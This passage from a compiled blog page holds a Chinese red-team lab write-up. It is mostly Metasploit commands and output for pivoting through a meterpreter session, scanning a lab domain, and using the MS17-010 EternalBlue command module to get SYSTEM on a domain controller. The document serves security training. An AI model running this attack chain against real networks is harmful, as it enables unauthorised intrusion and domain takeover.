<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span></span>
<span class="line"></span>
<span class="line">Active Routing Table</span>
<span class="line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></span>
<span class="line"></span>
<span class="line">   Subnet             Netmask            Gateway</span>
<span class="line">   ------             -------            -------</span>
<span class="line">   <span class="token number">10.10</span>.10.0         <span class="token number">255.255</span>.255.0      Session <span class="token number">1</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>设置代理</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> background </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Backgrounding session <span class="token number">1</span><span class="token punctuation">..</span>.</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/server/socks_proxy</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>auxiliary/server/socks_proxy<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   PASSWORD                   no        Proxy password <span class="token keyword">for</span> SOCKS5 listener</span>
<span class="line">   SRVHOST   <span class="token number">0.0</span>.0.0          <span class="token function">yes</span>       The address to listen on</span>
<span class="line">   SRVPORT   <span class="token number">1080</span>             <span class="token function">yes</span>       The port to listen on</span>
<span class="line">   USERNAME                   no        Proxy username <span class="token keyword">for</span> SOCKS5 listener</span>
<span class="line">   VERSION   <span class="token number">5</span>                <span class="token function">yes</span>       The SOCKS version to use <span class="token punctuation">(</span>Accepted: 4a, <span class="token number">5</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Auxiliary action:</span>
<span class="line"></span>
<span class="line">   Name   Description</span>
<span class="line">   ----   -----------</span>
<span class="line">   Proxy  Run a SOCKS proxy server</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> srvhost <span class="token number">127.0</span>.0.1</span>
<span class="line">srvhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">127.0</span>.0.1</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job <span class="token number">0</span>.</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the SOCKS proxy server</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现设置的代理无法使用，重启了下代理，直接起不来了。。。</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job <span class="token number">259</span>.</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the SOCKS proxy server</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopping the SOCKS proxy server</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>重来一次，好了：（换了个Payload：<code>windows/meterpreter/reverse_tcp</code>）</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; run post/multi/manage/autoroute</span>
<span class="line"></span>
<span class="line">[!] SESSION may not be compatible with this module:</span>
<span class="line">[!]  * incompatible session platform: windows</span>
<span class="line">[*] Running module against WEB</span>
<span class="line">[*] Searching for subnets to autoroute.</span>
<span class="line">[+] Route added to subnet 10.10.10.0/255.255.255.0 from host&#39;s routing table.</span>
<span class="line">[+] Route added to subnet 192.168.111.0/255.255.255.0 from host&#39;s routing table.</span>
<span class="line"></span>
<span class="line">meterpreter &gt; run autoroute -p</span>
<span class="line"></span>
<span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
<span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span>
<span class="line"></span>
<span class="line">Active Routing Table</span>
<span class="line">====================</span>
<span class="line"></span>
<span class="line">   Subnet             Netmask            Gateway</span>
<span class="line">   ------             -------            -------</span>
<span class="line">   10.10.10.0         255.255.255.0      Session 1</span>
<span class="line">   192.168.111.0      255.255.255.0      Session 1</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="arp扫一下" tabindex="-1"><a class="header-anchor" href="#arp扫一下"><span>ARP扫一下</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> run post/windows/gather/arp_scanner <span class="token assign-left variable">RHOSTS</span><span class="token operator">=</span><span class="token number">10.10</span>.10.0/24</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running module against WEB</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> ARP Scanning <span class="token number">10.10</span>.10.0/24</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.10 MAC 00:0c:29:38:c3:bc <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.80 MAC 00:0c:29:5a:92:ff <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.201 MAC 00:0c:29:71:5d:13 <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.255 MAC 00:0c:29:5a:92:ff <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span>     IP: <span class="token number">10.10</span>.10.254 MAC 00:50:56:fa:a2:7c <span class="token punctuation">(</span>VMware, Inc.<span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="存活主机扫描" tabindex="-1"><a class="header-anchor" href="#存活主机扫描"><span>存活主机扫描</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/scanner/netbios/nbname</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>auxiliary/scanner/netbios/nbname<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name       Current Setting  Required  Description</span>
<span class="line">   ----       ---------------  --------  -----------</span>
<span class="line">   BATCHSIZE  <span class="token number">256</span>              <span class="token function">yes</span>       The number of hosts to probe <span class="token keyword">in</span> each <span class="token builtin class-name">set</span></span>
<span class="line">   RHOSTS                      <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo</span>
<span class="line">                                         it</span>
<span class="line">   RPORT      <span class="token number">137</span>              <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>UDP<span class="token punctuation">)</span></span>
<span class="line">   THREADS    <span class="token number">10</span>               <span class="token function">yes</span>       The number of concurrent threads</span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">10.10</span>.10.0/24</span>
<span class="line">rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">10.10</span>.10.0/24</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending NetBIOS requests to <span class="token number">10.10</span>.10.0-<span class="token operator">&gt;</span><span class="token number">10.10</span>.10.255 <span class="token punctuation">(</span><span class="token number">256</span> hosts<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10 <span class="token punctuation">[</span>DC<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>DC, DE1AY<span class="token punctuation">)</span> Addresses:<span class="token punctuation">(</span><span class="token number">10.10</span>.10.10<span class="token punctuation">)</span> Mac:00:0c:29:38:c3:bc Virtual Machine:VMWare</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.80 <span class="token punctuation">[</span>WEB<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>WEB, DE1AY<span class="token punctuation">)</span>  Mac:00:0c:29:5a:92:ff Virtual Machine:VMWare</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>少了一台 201。</p><p>DC 10.10.10.10</p></blockquote><h4 id="nmap扫描" tabindex="-1"><a class="header-anchor" href="#nmap扫描"><span>nmap扫描</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">proxychains4 nmap -p 1-1000 -Pn -sT [IP_address]</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>DC：</p><p><img src="`+Z+'" alt="image-20220909000002317"></p><p>201：</p><p><img src="'+J+`" alt="image-20220909000024118"></p><blockquote><p>都开了445，看看版本号</p></blockquote><h4 id="查版本号" tabindex="-1"><a class="header-anchor" href="#查版本号"><span>查版本号</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use auxiliary/scanner/smb/smb_version </span>
<span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; options </span>
<span class="line"></span>
<span class="line">Module options (auxiliary/scanner/smb/smb_version):</span>
<span class="line"></span>
<span class="line">   Name     Current Setting  Required  Description</span>
<span class="line">   ----     ---------------  --------  -----------</span>
<span class="line">   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span>
<span class="line">   THREADS  1                yes       The number of concurrent threads (max one per host)</span>
<span class="line"></span>
<span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; set rhosts 10.10.10.201</span>
<span class="line">rhosts =&gt; 10.10.10.201</span>
<span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; run</span>
<span class="line"></span>
<span class="line">[*] 10.10.10.201:445      - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:3d 8h 33m 53s) (guid:{7c9d6895-d9a9-4cfa-b238-a99d5aec207c}) (authentication domain:DE1AY)</span>
<span class="line">[+] 10.10.10.201:445      -   Host is running Windows 7 Ultimate SP1 (build:7601) (name:PC) (domain:DE1AY)</span>
<span class="line">[*] 10.10.10.201:         - Scanned 1 of 1 hosts (100% complete)</span>
<span class="line">[*] Auxiliary module execution completed</span>
<span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; set rhosts 10.10.10.10</span>
<span class="line">rhosts =&gt; 10.10.10.10</span>
<span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; run</span>
<span class="line"></span>
<span class="line">[*] 10.10.10.10:445       - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:required) (uptime:6h 31m 35s) (guid:{5058d13b-deb5-4f11-b8ba-8cf79f7275f1}) (authentication domain:DE1AY)</span>
<span class="line">[+] 10.10.10.10:445       -   Host is running Windows 2012 R2 Standard (build:9600) (name:DC) (domain:DE1AY)</span>
<span class="line">[*] 10.10.10.10:          - Scanned 1 of 1 hosts (100% complete)</span>
<span class="line">[*] Auxiliary module execution completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>201 PC: Win7</p><p>10 DC: Win S 2012 R2</p></blockquote><h4 id="ms17-010" tabindex="-1"><a class="header-anchor" href="#ms17-010"><span>MS17_010</span></a></h4><p>上面两台均可利用入侵，以DC为例：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/admin/smb/ms17_010_command</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>auxiliary/admin/smb/ms17_010_command<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name                  Current Setting                     Required  Description</span>
<span class="line">   ----                  ---------------                     --------  -----------</span>
<span class="line">   COMMAND               net group <span class="token string">&quot;Domain Admins&quot;</span> /domain   <span class="token function">yes</span>       The <span class="token builtin class-name">command</span> you want to execute on the remote <span class="token function">host</span></span>
<span class="line">   DBGTRACE              <span class="token boolean">false</span>                               <span class="token function">yes</span>       Show extra debug trace info</span>
<span class="line">   LEAKATTEMPTS          <span class="token number">99</span>                                  <span class="token function">yes</span>       How many <span class="token builtin class-name">times</span> to try to leak transaction</span>
<span class="line">   NAMEDPIPE                                                 no        A named pipe that can be connected to <span class="token punctuation">(</span>leave blank <span class="token keyword">for</span> auto<span class="token punctuation">)</span></span>
<span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/da  <span class="token function">yes</span>       List of named pipes to check</span>
<span class="line">                         ta/wordlists/named_pipes.txt</span>
<span class="line">   RHOSTS                                                    <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit</span>
<span class="line">                                                                       -framework/wiki/Using-Metasploit</span>
<span class="line">   RPORT                 <span class="token number">445</span>                                 <span class="token function">yes</span>       The Target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span></span>
<span class="line">   SERVICE_DESCRIPTION                                       no        Service description to to be used on target <span class="token keyword">for</span> pretty listi</span>
<span class="line">                                                                       ng</span>
<span class="line">   SERVICE_DISPLAY_NAME                                      no        The <span class="token function">service</span> display name</span>
<span class="line">   SERVICE_NAME                                              no        The <span class="token function">service</span> name</span>
<span class="line">   SMBDomain             <span class="token builtin class-name">.</span>                                   no        The Windows domain to use <span class="token keyword">for</span> authentication</span>
<span class="line">   SMBPass                                                   no        The password <span class="token keyword">for</span> the specified username</span>
<span class="line">   SMBSHARE              C$                                  <span class="token function">yes</span>       The name of a writeable share on the server</span>
<span class="line">   SMBUser                                                   no        The username to authenticate as</span>
<span class="line">   THREADS               <span class="token number">1</span>                                   <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per <span class="token function">host</span><span class="token punctuation">)</span></span>
<span class="line">   WINPATH               WINDOWS                             <span class="token function">yes</span>       The name of the remote Windows directory</span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> <span class="token builtin class-name">command</span> <span class="token string">&quot;ipconfig&quot;</span></span>
<span class="line"><span class="token builtin class-name">command</span> <span class="token operator">=</span><span class="token operator">&gt;</span> ipconfig</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">10.10</span>.10.10</span>
<span class="line">rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">10.10</span>.10.10</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Target OS: Windows Server <span class="token number">2012</span> R2 Standard <span class="token number">9600</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Built a write-what-where primitive<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Overwrite complete<span class="token punctuation">..</span>. SYSTEM session obtained<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Service start timed out, OK <span class="token keyword">if</span> running a <span class="token builtin class-name">command</span> or non-service executable<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Getting the <span class="token builtin class-name">command</span> output<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Executing cleanup<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Cleanup was successful</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Command completed successfully<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Output <span class="token keyword">for</span> <span class="token string">&quot;ipconfig&quot;</span><span class="token builtin class-name">:</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Windows IP ����</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">���������� Ethernet0:</span>
<span class="line"></span>
<span class="line">   �����ض��� DNS ��׺ <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> </span>
<span class="line">   �������� IPv6 ��. <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> fe80::fa:a5d5:4ccb:b522%12</span>
<span class="line">   IPv4 �� <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">10.10</span>.10.10</span>
<span class="line">   ��������  <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">255.255</span>.255.0</span>
<span class="line">   Ĭ������. <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">10.10</span>.10.1</span>
<span class="line"></span>
<span class="line">���������� isatap.<span class="token punctuation">{</span>A5CDA27E-AD13-448E-9EAA-DACE69D64EAE<span class="token punctuation">}</span>:</span>
<span class="line"></span>
<span class="line">   ý��״  <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> ý���ѶϿ�</span>
<span class="line">   �����ض��� DNS ��׺ <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> </span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,87))])}const is=i(X,[["render",es]]),ts=JSON.parse('{"path":"/blogs/tech/security/net/lab/Lab02_ATT_CK_Red_Team_Practice_2.html","title":"ATT&cK实战系列—红队实战(二)","lang":"en-US","frontmatter":{"title":"ATT&cK实战系列—红队实战(二)","date":"2022-09-10T00:00:00.000Z","tags":["networking","security"],"categories":["tech"]},"headers":[{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[{"level":3,"title":"环境说明","slug":"环境说明","link":"#环境说明","children":[]},{"level":3,"title":"Web 机密码错误问题","slug":"web-机密码错误问题","link":"#web-机密码错误问题","children":[]},{"level":3,"title":"Web 服务配置","slug":"web-服务配置","link":"#web-服务配置","children":[]},{"level":3,"title":"环境确认","slug":"环境确认","link":"#环境确认","children":[]}]},{"level":2,"title":"信息收集","slug":"信息收集","link":"#信息收集","children":[{"level":3,"title":"后台","slug":"后台","link":"#后台","children":[]},{"level":3,"title":"SSRF","slug":"ssrf","link":"#ssrf","children":[]},{"level":3,"title":"CVE-2019-2725","slug":"cve-2019-2725","link":"#cve-2019-2725","children":[]},{"level":3,"title":"信息收集","slug":"信息收集-1","link":"#信息收集-1","children":[]},{"level":3,"title":"横向移动","slug":"横向移动","link":"#横向移动","children":[]}]}],"git":{"createdTime":1766928673000,"updatedTime":1766928673000,"contributors":[{"name":"PPPerryPan","email":"perrypan0123@outlook.com","commits":1}]},"filePathRelative":"blogs/tech/security/net/lab/Lab02_ATT_CK_Red_Team_Practice_2.md"}');export{is as comp,ts as data};
